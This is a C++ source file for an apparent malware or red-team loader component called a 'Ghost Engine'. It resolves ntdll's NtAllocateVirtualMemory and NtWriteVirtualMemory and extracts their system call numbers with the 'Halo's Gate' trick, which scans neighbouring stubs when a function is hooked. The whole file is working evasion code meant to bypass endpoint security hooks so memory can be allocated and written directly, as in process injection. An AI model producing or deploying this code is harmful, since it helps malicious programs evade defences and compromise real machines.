#include "../../common/headers/nt_structs.h"
#include <cstdint>

// Link to our ASM variables
extern "C" uint32_t wNtAllocateVirtualMemorySSN;
extern "C" uint32_t wNtWriteVirtualMemorySSN;

uint32_t ExtractSSN(PBYTE pFunctionAddress) {
    // If it starts with 4C 8B D1 B8 (Standard Syscall Pattern)
    if (*pFunctionAddress == 0x4C && *(pFunctionAddress + 1) == 0x8B) {
        return *(uint32_t*)(pFunctionAddress + 4);
    }

    // Halo's Gate: If hooked (0xE9), check neighboring syscalls
    if (*pFunctionAddress == 0xE9) {
        for (int i = 1; i <= 500; i++) {
            // Check neighbor above
            PBYTE pAbove = pFunctionAddress - (i * 32); // Syscalls are 32 bytes apart
            if (*pAbove == 0x4C && *(pAbove + 1) == 0x8B) {
                return *(uint32_t*)(pAbove + 4) + i;
            }
            // Check neighbor below
            PBYTE pBelow = pFunctionAddress + (i * 32);
            if (*pBelow == 0x4C && *(pBelow + 1) == 0x8B) {
                return *(uint32_t*)(pBelow + 4) - i;
            }
        }
    }
    return 0;
}

// Initialize the Ghost Engine
void InitGhostEngine(PVOID ntdllBase) {
    // 1. Walk EAT to find addresses (Use your aced EAT logic here)
    PBYTE pNtAlloc = (PBYTE)GetProcAddressManual(ntdllBase, "NtAllocateVirtualMemory");
    PBYTE pNtWrite = (PBYTE)GetProcAddressManual(ntdllBase, "NtWriteVirtualMemory");

    // 2. Extract and store the SSNs
    wNtAllocateVirtualMemorySSN = ExtractSSN(pNtAlloc);
    wNtWriteVirtualMemorySSN = ExtractSSN(pNtWrite);
}
